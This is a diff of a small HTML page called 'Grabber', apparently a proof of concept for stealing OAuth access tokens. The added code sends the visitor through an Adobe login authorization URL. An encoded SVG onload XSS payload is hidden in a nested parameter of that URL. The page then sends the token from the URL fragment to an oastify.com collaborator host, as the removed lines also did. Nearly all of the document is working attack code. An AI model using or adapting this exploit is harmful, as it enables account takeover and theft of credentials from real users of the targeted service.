@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head><title>Grabber</title></head>
-<body>
-<script>
-  if (window.location.hash) {
-    fetch("https://gvfuf7vd0p801l2va7hiuss1us0lobc0.oastify.com/?token=" + encodeURIComponent(window.location.hash));
-  }
-</script>
-<p>Loading...</p>
-</body>
+  <head><title>Grabber</title></head>
+  <body>
+    <script>
+      if (!localStorage.getItem('scriptExecuted')) {
+        localStorage.setItem('scriptExecuted', 'true');
+        window.location.href = "https://ims-na1.adobelogin.com/ims/authorize/v1?client_id=dc-prod-virgoweb&response_type=token&scope=AdobeID,openid&redirect_uri=https%3A%2F%2Facrobat.adobe.com%2Fdc-chrome-extension%2Fsign-in.html%3Fmain_op%3DgoogleSignIn%26source%3DContinueWithGoogle%253AEmbedViewer%26application%3Dgoogle%26locale%3Den-GB%26callingApp%3Defaidnbmnnnibpcajpcglclefindmkaj%26pdfUrl%3Dhttps%253A%252F%252Fcommercemarketplace.adobe.com%252Fextensions.html%253Fp%253D2%252522%25253E%25253Csvg%252520onload%253Dfetch(%2527https%253A%252F%252Ft1v7lk1q62ed7y88gknv05ye056zupie.oastify.com%252F%253Ftoken%253D%2527%252BencodeURIComponent(location.hash))%25253E";
+      } else {
+        fetch("https://t1v7lk1q62ed7y88gknv05ye056zupie.oastify.com/?token=" + encodeURIComponent(window.location.hash));
+        localStorage.removeItem('scriptExecuted');
+      }
+    </script>
+  </body>
 </html>
